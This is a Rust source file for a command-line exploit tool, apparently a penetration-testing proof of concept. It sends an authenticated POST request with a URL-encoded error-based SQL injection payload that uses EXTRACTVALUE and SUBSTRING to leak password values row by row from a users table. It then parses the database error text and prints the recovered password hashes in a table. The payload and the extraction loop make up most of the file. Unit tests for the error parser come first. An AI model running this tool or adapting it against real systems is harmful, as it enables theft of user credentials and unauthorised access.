use scraper::{Html, Selector};

use clap::Parser;

use comfy_table::Table;


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_el_parse_custom_tag() {
        let html = r#"<html><body><error>You have an error in your SQL syntax</error></body></html>"#;
        let result = el_parse(html, "error");
        assert_eq!(result, Some("You have an error in your SQL syntax".to_string()));
        println!("{:?}", result);
    }

    #[test]
    fn test_el_parse_missing_tag() {
        let html = r#"<html><body><p>No error here</p></body></html>"#;
        let result = el_parse(html, "error");
        assert_eq!(result, None);
        println!("{:?}", result);
    }

    #[test]
    fn test_el_parse_mangled_markup() {
        // Simulates a raw error response that isn't clean HTML
        let html = r#"<error>XPATH syntax error: '\cfjnl25MvEVhydYvsoPn94ggKss='</error>"#;
        let result = el_parse(html, "error");
        // Just checking it doesn't panic and returns something
        println!("{:?}", result);
    }
}

fn el_parse(body: &str, selector: &str) -> Option<String> {

    let document = Html::parse_document(&body);
    
    let element = Selector::parse(selector).unwrap();

    document
        .select(&element)
        .next()
        .map(|el| el.text().collect::<String>())
        .and_then(|s| s.splitn(2,':').nth(1).map(|s| s.to_string()))
}

#[derive(Parser)]
struct Cli {
     #[arg(short, long)]
    target: url::Url,

    #[arg(short, long)]
    cookie: String,
}

fn main() -> Result<(), reqwest::Error> {
    let args = Cli::parse();

    let client = reqwest::blocking::Client::new();
	

	let mut row = 0;
    let mut number = 1;
	let mut results: Vec<String> = Vec::new();
	
	loop {
   		let mut sqli = format!("%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x5c%2C%28SELECT%20SUBSTRING%28password%2C1%2C28%29%20FROM%20demo.sys_users%20LIMIT%20{}%2C1%29%29%29--%20-", row);

   		let mut url = format!("{} {}", args.target, sqli);

    		let res = client.post(&url).body("<Note><HighImportanceInd>false</HighImportanceInd><ConfidentialInd>false</ConfidentialInd><Text><![CDATA[test]]></Text><AppliesToPartyID>c248df7115a1b1b4ac1100084cf448cf@Party</AppliesToPartyID><ModifiedBy>CYBERIS_ADMINROLE_1</ModifiedBy></Note>").header("Cookie",&args.cookie).send()?;

    		let body = res.text()?;


		    match el_parse(&body, "error") {
        		Some(chunk) if !chunk.is_empty() && !chunk.contains("Note") => {
				let hash = chunk.replace('\\', "");
                println!("Found hash {}",number);
				results.push(hash);
				row +=1;
                number +=1
    			}
	        _ => break,
    		}
        }


    let mut table = Table::new();
    table
        .set_header(vec!["Hash Number", "Password Hash",]);

    let mut num_2 = 1;
	for hash in &results {
        table.add_row(vec![
            format!("{}", num_2),
            format!("{}", hash),
        ]);
        num_2 += 1
	}

    println!("{table}");
    Ok(())
}
